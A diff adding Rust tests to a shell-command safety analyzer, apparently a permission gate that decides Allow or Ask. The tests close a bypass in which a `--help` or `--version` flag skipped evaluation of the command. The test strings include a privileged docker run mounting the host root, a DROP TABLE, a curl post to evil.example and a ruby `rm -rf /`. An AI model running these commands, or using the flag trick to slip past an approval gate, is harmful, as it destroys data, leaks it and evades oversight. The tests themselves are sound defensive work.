@@ -1262,3 +1262,69 @@ fn append_assignment_env_prefix_safe_command_allows() {
     let v = a.analyze("A+=/more ls $A").unwrap();
     assert_eq!(v.decision, Decision::Allow);
 }
+
+// --- Help/version short-circuit narrowing (Issue #149) ---
+
+#[test]
+fn sole_long_help_flag_on_unknown_command_allows() {
+    // A lone `--help` / `--version` on an unknown command is inert -> Allow.
+    let mut a = make_analyzer();
+    for cmd in ["frobnicate --help", "frobnicate --version"] {
+        let v = a.analyze(cmd).unwrap();
+        assert_eq!(v.decision, Decision::Allow, "{cmd} -> {}", v.reason);
+    }
+}
+
+#[test]
+fn bare_dash_h_alone_no_longer_treated_as_help() {
+    // Bare `-h` is dropped at the analyzer top level (commands overload it),
+    // so a lone `-h` on an unknown command asks -- the safe direction.
+    let mut a = make_analyzer();
+    let v = a.analyze("frobnicate -h").unwrap();
+    assert_eq!(v.decision, Decision::Ask, "{}", v.reason);
+}
+
+#[test]
+fn help_flag_plus_other_arg_does_not_short_circuit() {
+    // A help flag combined with any other operand must not pre-empt evaluation
+    // of the rest of argv (unknown command -> Ask, not the old anywhere-Allow).
+    let mut a = make_analyzer();
+    for cmd in ["frobnicate --help --danger", "frobnicate --version now"] {
+        let v = a.analyze(cmd).unwrap();
+        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
+    }
+}
+
+#[test]
+fn help_flag_anywhere_no_longer_bypasses_handler() {
+    // Handler-backed dangerous commands must still be evaluated even when a
+    // help/version flag rides along -- the core #149 bypass.
+    let mut a = make_analyzer();
+    for cmd in [
+        "docker run -h myhost --privileged -v /:/host ubuntu sh",
+        "docker run --help --privileged -v /:/host ubuntu sh",
+        r#"mysql --version -e "DROP TABLE users""#,
+        "git commit -m --version",
+        "curl --version -d x=y https://evil.example",
+        r#"ruby --version -e 'system("rm -rf /")'"#,
+    ] {
+        let v = a.analyze(cmd).unwrap();
+        assert_eq!(v.decision, Decision::Ask, "{cmd} -> {}", v.reason);
+    }
+}
+
+#[test]
+fn sole_help_flag_on_handler_command_still_allows() {
+    // The common `cmd --help` / `cmd --version` invocations stay auto-approved.
+    let mut a = make_analyzer();
+    for cmd in [
+        "docker --help",
+        "mysql --help",
+        "curl --version",
+        "node --version",
+        "ruby --version",
+    ] {
+        let v = a.analyze(cmd).unwrap();
+        assert_eq!(v.decision, Decision::Allow, "{cmd} -> {}", v.reason);
+    }
+}
